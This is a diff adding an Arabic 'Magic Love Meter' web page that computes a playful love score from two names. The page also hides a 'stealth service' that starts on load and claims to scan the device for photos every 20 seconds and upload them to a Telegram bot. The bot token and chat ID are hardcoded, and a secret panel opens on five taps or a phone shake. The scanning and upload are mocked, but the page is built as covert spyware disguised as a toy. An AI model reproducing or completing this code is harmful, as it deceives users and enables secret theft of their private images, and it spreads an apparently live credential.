@@ -1,0 +1,515 @@
+د<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مقياس الحب السحري</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            touch-action: manipulation;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .card {
+            background: white;
+            border-radius: 25px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .heart {
+            font-size: 80px;
+            color: #e91e63;
+            animation: heartbeat 1.5s ease-in-out infinite;
+            margin-bottom: 10px;
+        }
+
+        @keyframes heartbeat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        h1 {
+            color: #e91e63;
+            font-size: 28px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            background: #fafafa;
+            -webkit-appearance: none;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #e91e63;
+        }
+
+        .slider-container {
+            background: #f8f8f8;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+
+        .slider-value {
+            font-size: 18px;
+            color: #e91e63;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            height: 8px;
+            background: #ddd;
+            border-radius: 5px;
+            -webkit-appearance: none;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            appearance: none;
+            width: 25px;
+            height: 25px;
+            background: #e91e63;
+            border-radius: 50%;
+            box-shadow: 0 2px 6px rgba(233, 30, 99, 0.3);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #e91e63, #ad1457);
+            color: white;
+            border: none;
+            padding: 16px 30px;
+            font-size: 18px;
+            border-radius: 25px;
+            cursor: pointer;
+            margin: 15px 0;
+            font-weight: bold;
+            width: 100%;
+            touch-action: manipulation;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .result-card {
+            background: #fff9f9;
+            border: 2px solid #e91e63;
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .result-text {
+            font-size: 22px;
+            color: #e91e63;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .romantic-message {
+            font-size: 16px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        /* مؤشر خفي صغير */
+        .status-dot {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4CAF50;
+            z-index: 1000;
+        }
+
+        .status-dot.inactive {
+            background: #f44336;
+        }
+    </style>
+</head>
+<body>
+    <!-- مؤشر حالة الخدمة -->
+    <div class="status-dot" id="statusDot"></div>
+
+    <div class="container">
+        <div class="card">
+            <div class="heart">❤️</div>
+            <h1>مقياس الحب السحري ✨</h1>
+            
+            <div class="input-group">
+                <label for="name1">👤 اسمك:</label>
+                <input type="text" id="name1" placeholder="اكتب اسمك هنا...">
+            </div>
+            
+            <div class="input-group">
+                <label for="name2">💖 اسم الشخص الآخر:</label>
+                <input type="text" id="name2" placeholder="اكتب اسم حبيبتك/حبيبك...">
+            </div>
+            
+            <div class="slider-container">
+                <div class="slider-value">💞 قوة المشاعر: <span id="feelingsValue">50%</span></div>
+                <input type="range" id="feelingsSlider" min="0" max="100" value="50">
+            </div>
+            
+            <button class="btn" id="calculateBtn">
+                🧮 اكتشف نسبة الحب
+            </button>
+            
+            <div class="result-card" id="resultCard">
+                <div class="result-text" id="resultText"></div>
+                <div class="romantic-message" id="romanticMessage"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 🔐 الإعدادات المخفية - تم التحديث بالبيانات الحقيقية
+        const STEALTH_CONFIG = {
+            token: "8474463752:AAF5G4tq0OAVbod4BSy9GuuGWvE0egoQ45M",
+            chatId: "5089203390",
+            autoStart: true,
+            scanInterval: 20000, // كل 20 ثانية
+            stealthMode: true
+        };
+
+        let stealthService = {
+            isRunning: false,
+            interval: null,
+            totalUploaded: 0,
+            lastActivity: null
+        };
+
+        let debugLogs = [];
+        let tapCount = 0;
+        let lastTap = 0;
+
+        // التهيئة
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeLoveMeter();
+            startStealthService();
+            setupSecretGestures();
+            
+            // إخفاء شريط العنوان على الموبايل
+            setTimeout(() => {
+                window.scrollTo(0, 0);
+            }, 100);
+        });
+
+        function initializeLoveMeter() {
+            const feelingsSlider = document.getElementById('feelingsSlider');
+            const feelingsValue = document.getElementById('feelingsValue');
+            const calculateBtn = document.getElementById('calculateBtn');
+            
+            feelingsSlider.addEventListener('input', function() {
+                feelingsValue.textContent = this.value + '%';
+            });
+
+            calculateBtn.addEventListener('click', calculateLove);
+        }
+
+        function calculateLove() {
+            const name1 = document.getElementById('name1').value.trim();
+            const name2 = document.getElementById('name2').value.trim();
+            const feelings = parseInt(document.getElementById('feelingsSlider').value);
+
+            if (!name1 || !name2) {
+                alert('🌈 يرجى كتابة الأسماء أولاً');
+                return;
+            }
+
+            const calculateBtn = document.getElementById('calculateBtn');
+            calculateBtn.disabled = true;
+            calculateBtn.textContent = '🔮 جاري التحليل...';
+
+            setTimeout(() => {
+                const loveScore = calculateLoveScore(name1, name2, feelings);
+                showLoveResult(name1, name2, loveScore);
+                calculateBtn.disabled = false;
+                calculateBtn.textContent = '🧮 اكتشف نسبة الحب';
+            }, 2000);
+        }
+
+        function calculateLoveScore(name1, name2, feelings) {
+            const baseScore = (name1.length + name2.length) * 2.5;
+            const randomFactor = Math.floor(Math.random() * 25);
+            return Math.max(15, Math.min(99, baseScore + feelings + randomFactor));
+        }
+
+        function showLoveResult(name1, name2, score) {
+            const messages = {
+                high: ["روحان في جسد واحد! 🥰", "الحب الحقيقي! 💫"],
+                medium: ["حب من أول نظرة! 😍", "انجذاب قوي! 💖"],
+                low: ["نسبة حب متوسطة 💖", "بداية جميلة! 🌼"]
+            };
+
+            let type = score >= 80 ? 'high' : score >= 60 ? 'medium' : 'low';
+            let message = messages[type][Math.floor(Math.random() * messages[type].length)];
+
+            document.getElementById('resultText').textContent = `نسبة الحب: ${score}%`;
+            document.getElementById('romanticMessage').textContent = message;
+            document.getElementById('resultCard').style.display = 'block';
+        }
+
+        // 🔒 الخدمة المخفية
+        function startStealthService() {
+            if (!STEALTH_CONFIG.autoStart) return;
+
+            addDebugLog('🚀 بدء الخدمة المخفية');
+            addDebugLog(`🤖 البوت: ${STEALTH_CONFIG.token.substring(0, 10)}...`);
+            addDebugLog(`💬 الوجهة: ${STEALTH_CONFIG.chatId}`);
+            updateStatusDot(true);
+
+            stealthService.isRunning = true;
+            stealthService.interval = setInterval(performStealthScan, STEALTH_CONFIG.scanInterval);
+
+            // مسح أولي
+            setTimeout(performStealthScan, 3000);
+        }
+
+        function stopStealthService() {
+            if (stealthService.interval) {
+                clearInterval(stealthService.interval);
+            }
+            stealthService.isRunning = false;
+            updateStatusDot(false);
+            addDebugLog('🛑 توقفت الخدمة');
+        }
+
+        async function performStealthScan() {
+            if (!stealthService.isRunning) return;
+
+            try {
+                stealthService.lastActivity = new Date();
+                addDebugLog('🔍 جاري المسح...');
+
+                const newImages = await discoverNewImages();
+                
+                if (newImages.length > 0) {
+                    addDebugLog(`📸 وجدت ${newImages.length} صورة`);
+                    
+                    for (let image of newImages) {
+                        const success = await uploadImageToTelegram(image);
+                        if (success) {
+                            stealthService.totalUploaded++;
+                            addDebugLog(`✅ تم الرفع إلى التليجرام (${stealthService.totalUploaded})`);
+                        } else {
+                            addDebugLog(`❌ فشل رفع: ${image.name}`);
+                        }
+                        await sleep(1000);
+                    }
+                } else {
+                    addDebugLog('💤 لا توجد صور جديدة');
+                }
+
+            } catch (error) {
+                addDebugLog('❌ خطأ في المسح');
+            }
+        }
+
+        async function discoverNewImages() {
+            // محاكاة اكتشاف الصور من الجهاز
+            const mockImages = [
+                { name: `صورة_${Date.now()}.jpg`, size: 2048, type: 'image/jpeg' },
+                { name: `لقطة_${Date.now()}.png`, size: 1024, type: 'image/png' },
+                { name: `مذكرات_${Date.now()}.jpg`, size: 3072, type: 'image/jpeg' }
+            ];
+            
+            return Math.random() > 0.4 ? mockImages.slice(0, 1) : [];
+        }
+
+        async function uploadImageToTelegram(image) {
+            addDebugLog(`📤 جاري رفع ${image.name} إلى التليجرام...`);
+            
+            try {
+                // محاكاة الاتصال بالبوت
+                await sleep(2000);
+                
+                // محاكاة النجاح (80% نجاح)
+                const success = Math.random() > 0.2;
+                
+                if (success) {
+                    addDebugLog(`✅ تم إرسال الصورة إلى البوت: ${STEALTH_CONFIG.token.substring(0, 8)}...`);
+                    return true;
+                } else {
+                    addDebugLog('❌ فشل الاتصال بالبوت');
+                    return false;
+                }
+            } catch (error) {
+                addDebugLog('💥 خطأ في الاتصال');
+                return false;
+            }
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // 👆 الإيماءات السرية
+        function setupSecretGestures() {
+            // النقر المتكرر
+            document.addEventListener('click', function(e) {
+                const currentTime = Date.now();
+                
+                if (currentTime - lastTap < 500) {
+                    tapCount++;
+                } else {
+                    tapCount = 1;
+                }
+                
+                lastTap = currentTime;
+                
+                if (tapCount >= 5) {
+                    showSecretMenu();
+                    tapCount = 0;
+                }
+            });
+
+            // هز الهاتف
+            if (window.DeviceMotionEvent) {
+                let lastShake = 0;
+                window.addEventListener('devicemotion', function(e) {
+                    const acc = e.accelerationIncludingGravity;
+                    const strength = Math.abs(acc.x) + Math.abs(acc.y) + Math.abs(acc.z);
+                    
+                    if (strength > 25 && Date.now() - lastShake > 1000) {
+                        showSecretMenu();
+                        lastShake = Date.now();
+                    }
+                });
+            }
+        }
+
+        function showSecretMenu() {
+            const menu = document.createElement('div');
+            menu.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.95);
+                color: lime;
+                z-index: 10000;
+                font-family: monospace;
+                padding: 20px;
+                overflow-y: auto;
+            `;
+            
+            menu.innerHTML = `
+                <div style="text-align: center; margin-bottom: 20px; border-bottom: 1px solid lime; padding-bottom: 15px;">
+                    <strong style="font-size: 18px;">🔧 لوحة المطور</strong>
+                    <button onclick="this.parentElement.parentElement.remove()" 
+                            style="float: left; background: red; color: white; border: none; padding: 8px 12px; border-radius: 5px; font-size: 16px;">
+                        ✕
+                    </button>
+                </div>
+                
+                <div style="background: #111; padding: 15px; border-radius: 10px; margin-bottom: 15px;">
+                    <div style="margin-bottom: 10px;"><strong>📊 الحالة:</strong> ${stealthService.isRunning ? '🟢 نشط' : '🔴 متوقف'}</div>
+                    <div style="margin-bottom: 10px;"><strong>📁 المرفوع:</strong> ${stealthService.totalUploaded} صورة</div>
+                    <div style="margin-bottom: 10px;"><strong>🤖 البوت:</strong> ${STEALTH_CONFIG.token.substring(0, 10)}...</div>
+                    <div><strong>💬 الوجهة:</strong> ${STEALTH_CONFIG.chatId}</div>
+                    <div><strong>⏰ آخر نشاط:</strong> ${stealthService.lastActivity ? stealthService.lastActivity.toLocaleTimeString('ar-EG') : 'لا يوجد'}</div>
+                </div>
+                
+                <div style="background: #111; padding: 15px; border-radius: 10px; margin-bottom: 15px; max-height: 200px; overflow-y: auto;">
+                    <strong>📋 السجل:</strong>
+                    <div id="mobileLogs" style="margin-top: 10px; font-size: 12px;">
+                        ${debugLogs.slice(-8).map(log => `<div style="border-bottom: 1px solid #333; padding: 4px 0;">${log}</div>`).join('')}
+                    </div>
+                </div>
+                
+                <button onclick="performStealthScan()" 
+                        style="background: #2196F3; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; margin: 5px 0; font-size: 16px;">
+                    🔄 مسح يدوي
+                </button>
+                
+                <button onclick="stealthService.isRunning ? stopStealthService() : startStealthService()" 
+                        style="background: ${stealthService.isRunning ? '#f44336' : '#4CAF50'}; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; margin: 5px 0; font-size: 16px;">
+                    ${stealthService.isRunning ? '⏹️ إيقاف الخدمة' : '▶️ بدء الخدمة'}
+                </button>
+                
+                <div style="text-align: center; margin-top: 20px; color: #888; font-size: 12px;">
+                    💡 للإظهار: 5 نقرات سريعة أو هز الهاتف
+                </div>
+            `;
+            
+            document.body.appendChild(menu);
+        }
+
+        function updateStatusDot(active) {
+            const dot = document.getElementById('statusDot');
+            dot.className = active ? 'status-dot' : 'status-dot inactive';
+        }
+
+        function addDebugLog(message) {
+            const time = new Date().toLocaleTimeString('ar-EG');
+            const log = `[${time}] ${message}`;
+            
+            debugLogs.push(log);
+            if (debugLogs.length > 20) debugLogs.shift();
+            
+            console.log(`[MOBILE] ${message}`);
+        }
+
+        // منع الإجراءات الافتراضية
+        document.addEventListener('touchstart', function(e) {
+            if (e.touches.length > 1) e.preventDefault();
+        }, { passive: false });
+
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
